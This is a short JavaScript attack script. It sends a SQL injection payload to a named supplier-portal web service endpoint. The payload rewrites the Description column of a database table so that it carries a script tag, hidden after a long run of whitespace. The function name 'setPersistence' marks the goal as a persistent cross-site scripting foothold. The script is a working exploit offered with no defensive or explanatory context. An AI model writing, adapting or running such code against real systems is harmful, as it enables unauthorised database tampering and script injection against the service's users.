const url = '';
const xss = '                                                                                                                                                                         ' +
            '<script src="' + url + '"></script>';
const payload = "update Solleciti_ODA set [Description] = CONVERT(varchar, [Description]) + '" +
                xss +
                "' where ProposedDate != '1900-01-01 00:00:00' and ConfirmedDate = '1900-01-01 00:00:00'";

function setPersistence() {
    fetch('https://partners.facco.net/App_WebServices/DeliveryDateUpdater.asmx/GetUpdates', {
        method : 'POST',
        headers : {
            "Content-Type": "application/json"
        },
        body : JSON.stringify({
            SupCode : payload
        })
    });
}